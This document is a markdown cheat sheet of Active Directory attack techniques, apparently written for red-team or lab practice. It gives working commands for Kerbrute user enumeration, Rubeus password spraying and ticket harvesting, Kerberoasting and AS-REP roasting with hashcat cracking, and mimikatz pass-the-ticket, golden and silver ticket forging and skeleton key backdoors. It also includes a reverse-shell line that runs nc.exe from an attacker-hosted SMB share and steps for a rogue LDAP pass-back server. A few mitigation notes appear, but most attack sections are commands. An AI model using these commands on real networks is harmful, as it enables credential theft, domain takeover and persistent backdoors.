# Active Directory (AD) and Windows

## Checklist
- [ ] Password Searching
  - [ ] LaZagne
  - [ ] Snaffler
  - [ ] mimikittenz
- [ ] Password Reuse
- [ ] Bloodhound
- [ ] Kerberos
  - [ ] Kerbrute Enumeration
  - [ ] Pass the Ticket
  - [ ] Kerberoasting
  - [ ] AS-REP Roasting
  - [ ] Golden Ticket
  - [ ] Silver Ticket
  - [ ] Skeleton Key
- [ ] Pass the Hash
- [ ] Old Windows
  - [ ] Windows Server (R) 2008 Standard 6001 Service Pack 1 -> CVE-2009-3103 - MS09-050 -> exploit/windows/smb/ms09_050_smb2_negotiate_func_index

## Tools

- [kerbrute](https://github.com/ropnop/kerbrute) - to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication
- [Rubeus](https://github.com/GhostPack/Rubeus) - for Kerberos
- [kekeo](https://github.com/gentilkiwi/kekeo)\* - for Kerberoasting (NOT_USE)
- [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)\* - for Kerberoasting (NOT_USE)
- [Mimikatz](https://github.com/ParrotSec/mimikatz)

## Commands

## Wordlists

- User and Password: https://github.com/Cryilllic/Active-Directory-Wordlists/tree/master

## Services

### SMB

```
nmap -script=smb-vuln\* -p445 $IP
```

## File Transfer

On Kali:
```
impacket-smbserver -smb2support Share /root/path/to/file
```
On Windows
```
cmd.exe /c //LHOST/Share/nc.exe -e cmd.exe LHOST LPORT
```

## Reverse Shells

If there is a PATH issue fixing it:

```
set PATH=%SystemRoot%\system32;%SystemRoot%;
```
```
set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\
```

## Common Issues

If you are not able to find PowerShell, try to run the full path:
```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe C:\Windows\Temp\filename.ps1
```


## NTLM and NetNTLM

New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is heavily used by the services on a network. However, services that use NetNTLM can also be exposed to the internet. The following are some of the popular examples:

- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal
- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
- Exposed VPN endpoints that were integrated with AD.
- Web applications that are internet-facing and make use of NetNTLM.

NetNTLM, also often referred to as Windows Authentication or just NTLM Authentication, allows the application to play the role of a middle man between the client and AD. All authentication material is forwarded to a Domain Controller in the form of a challenge, and if completed successfully, the application will authenticate the user.

This means that the application is authenticating on behalf of the user and not authenticating the user directly on the application itself. This prevents the application from storing AD credentials, which should only be stored on a Domain Controller. This process is shown in the diagram below:

![image](https://github.com/user-attachments/assets/a82e64ff-351c-40c5-9386-378c44523d73)

### Brute Force

We could perhaps try to use these for brute force attacks if we recovered information such as valid email addresses during our initial red team recon. Since most AD environments have account lockout configured, we won't be able to run a full brute-force attack. Instead, we need to perform a password spraying attack. Instead of trying multiple different passwords, which may trigger the account lockout mechanism, we choose and use one password and attempt to authenticate with all the usernames we have acquired.

### Password Spraying

## LDAP (Lightweight Directory Access Protocol)

LDAP authentication is similar to NTLM authentication. However, with LDAP authentication, the application directly verifies the user's credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials. LDAP authentication is a popular mechanism with third-party (non-Microsoft) applications that integrate with AD. These include applications and systems such as:

- Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs

If any of these applications or services are exposed on the internet, the same type of attacks as those leveraged against NTLM authenticated systems can be used. However, since a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. In essence, we can attempt to recover the AD credentials used by the service to gain authenticated access to AD. The process of authentication through LDAP is shown below:

![image](https://github.com/user-attachments/assets/65ef0bab-8e4e-4ecb-91f4-bdec5c5c1a27)

### LDAP Pass-back Attacks

LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as `admin:admin` or `admin:password`. Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials. We will need to create a rogue LDAP server and configure it insecurely to ensure the credentials are sent in plaintext.

There are several ways to host a rogue LDAP server, but we will use OpenLDAP for this example.

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
```

Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports `PLAIN` and `LOGIN` authentication methods. To do this, we need to create a new ldif file, called with the following content:

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties:
- `olcSaslSecProps`: Specifies the SASL security properties
- `noanonymous`: Disables mechanisms that support anonymous login
- `minssf`: Specifies the minimum acceptable security strength with 0, meaning no protection.

Now we can use the ldif file to patch our LDAP server using the following:

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

We can verify that our rogue LDAP server's configuration has been applied using the following command:

```
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

Then listen for the service:

```
sudo tcpdump -SX -i breachad tcp port 389
```


## Kerberos (Windows ticket-granting service (TGS))

Kerberos is a computer network authentication protocol that operates based on tickets, allowing nodes to securely prove their identity to one another over a non-secure network. It primarily aims at a client-server model and provides mutual authentication, where the user and the server verify each other's identity. The Kerberos protocol messages are protected against eavesdropping and replay attacks, and it builds on symmetric-key cryptography, requiring a trusted third party.

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption.

#### Common Terminology:

- Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
- Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
- Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
- Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
- Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

#### AS-REQ w/ Pre-Authentication In Detail

The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

#### Ticket Granting Ticket Contents

In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

![image](https://github.com/user-attachments/assets/4ff512b5-8170-40e5-94d4-efec0f507416)

#### Service Ticket Contents

To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

- Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
- User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

![image](https://github.com/user-attachments/assets/97633c72-33bd-40e7-a222-38c69dd3eacd)

#### Kerberos Authentication Overview

![image](https://github.com/user-attachments/assets/ac16e648-4198-466c-8c74-1f481035fadc)

1. AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
2. AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
3. TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
4. TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
5. AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
6. AP-REP - 6.) The service grants access

#### Kerberos Tickets Overview

The main ticket you will receive is a ticket-granting ticket (TGT). These can come in various forms, such as a **`.kirbi`** for **Rubeus** and **`.ccache`** for **Impacket**. A ticket is typically base64 encoded and can be used for multiple attacks. 

The ticket-granting ticket is only used to get service tickets from the KDC. When requesting a TGT from the KDC, the user will authenticate with their credentials to the KDC and request a ticket. The server will validate the credentials, create a TGT and encrypt it using the krbtgt key. The encrypted TGT and a session key will be sent to the user.

When the user needs to request a service ticket, they will send the TGT and the session key to the KDC, along with the service principal name (SPN) of the service they wish to access. The KDC will validate the TGT and session key. If they are correct, the KDC will grant the user a service ticket, which can be used to authenticate to the corresponding service.

#### Attack Privilege Requirements

- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required

### Kerbrute

﻿Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

#### Abusing Pre-Authentication Overview

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

#### Enumerating Users w/ Kerbrute

Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

> [Wordlist](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt)

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```
- `--dc`: Domain Controller address
- `-d`: Domain Name

### Rubeus

Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

#### Harvesting Tickets w/ Rubeus

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

```
# to harvest for TGTs every 30 seconds
.\Rubeus.exe harvest /interval:30
```

#### Brute-Forcing / Password-Spraying w/ Rubeus

Rubeus can both brute force passwords as well as password spray user accounts.
- When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account.
- In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a `.kirbi` ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

```
# a given password and "spray" it against all found users then give the .kirbi TGT for that user
.\Rubeus.exe brute /password:Password1 /noticket
```

> Be mindful of how you use this attack as it may lock you out of the network depending on the *account lockout policies*.

### Kerberoasting

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain.

#### Kerberoasting w/ Rubeus

```
.\Rubeus.exe kerberoast /nowrap
#After getting hash crack it using hashcat
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

#### Kerberoasting w/ Impacket

```
#Python Impacket
#this does not have to be on the targets machine and can be done remotely
/opt/impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.171.81 -request
```

> After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the **NTDS.dit**. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users.

#### kekeo

#### Invoke-Kerberoast.ps1

#### Kerberoasting Mitigation
- Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
- Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

### AS-REP Roasting with Rubeus and Impacket

Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

#### Dumping KRBASREP5 Hashes w/ Rubeus

Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.

```
# looking for vulnerable users and then dump found vulnerable user hashes
.\Rubeus.exe asreproast /nowrap
# cracking
hashcat -m 18200 -a 0 hash.txt Pass.txt
```

#### kekeo 

#### GetNPUsers.py

#### AS-REP Roasting Mitigations

- Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
- Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

### Pass the Ticket (PtH)

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a `.kirbi` ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

![image](https://github.com/user-attachments/assets/9c0188db-029e-48f2-8f19-7da16a2f80f6)

#### mimikatz

```
# CMD - Run as Administrator
.\mimikatz.exe
#In mimikatz context menu
privilege::debug
# [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
# Export all of the .kirbi tickets into the current dir
sekurlsa::tickets /export
# cache and impersonate the given ticket
kerberos::ptt <ticket-full-name>
# Verify by listing our cached tickets (in CMD)
klist
```

#### Pass the Ticket Mitigation

- Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

### Golden/Silver Ticket Attacks

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

#### mimikatz

```
# Dump the krbtgt hash
.\mimikatz.exe
privilege::debug
# dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account
lsadump::lsa /inject /name:krbtgt
# Create golden ticket
kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
# Create silver ticket
kerberos::golden /user:Administrator /domain:controller.local /sid:<sid-of-service-account> /krbtgt:<service-NTLM-hash> /id:<id>
#<id> can be 1103
# Use the Golden/Silver Ticket to access other machines
# open a new elevated command prompt with the given ticket in mimikatz
misc::cmd
```

> Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

### Skeleton key attacks using mimikatz (Kerberos Backdoors)

Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. The default hash for a mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF6` which makes the password -"`mimikatz`".

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

#### mimikatz

```
.\mimikatz.exe
privilege::debug
misc::skeleton
# Then in CMD
# share will now be accessible without the need for the Administrators password
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```

> The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques.

## References
- [ ] https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
- [ ] https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
- [ ] https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
- [ ] https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
- [ ] https://www.varonis.com/blog/kerberos-authentication-explained/
- [ ] https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
- [ ] https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
- [ ] https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf
